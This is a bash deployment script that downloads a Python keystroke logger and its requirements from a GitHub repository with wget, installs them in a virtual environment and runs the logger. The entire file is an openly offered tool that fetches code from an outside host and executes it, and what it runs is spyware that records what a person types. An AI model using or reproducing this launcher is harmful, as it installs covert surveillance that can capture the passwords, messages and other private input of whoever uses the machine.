#!/bin/bash


PROGRAM_URL="https://raw.githubusercontent.com/exploittracer/keystroke-logger/refs/heads/main/keystroke_logger.py"
REQUIREMENTS_URL="https://raw.githubusercontent.com/exploittracer/keystroke-logger/refs/heads/main/requirements.txt"
PROGRAM_NAME="keystroke_logger.py"

echo "[+] Downloading Python program..."
wget -O "$PROGRAM_NAME" "$PROGRAM_URL"

echo "[+] Downloading requirements..."
wget -O requirements.txt "$REQUIREMENTS_URL"

python3 -m venv venv
source venv/bin/activate

[ -f "requirements.txt" ] && pip install -r requirements.txt

mkdir output

echo "[+] Running $PROGRAM_NAME..."
python3 "$PROGRAM_NAME"
deactivate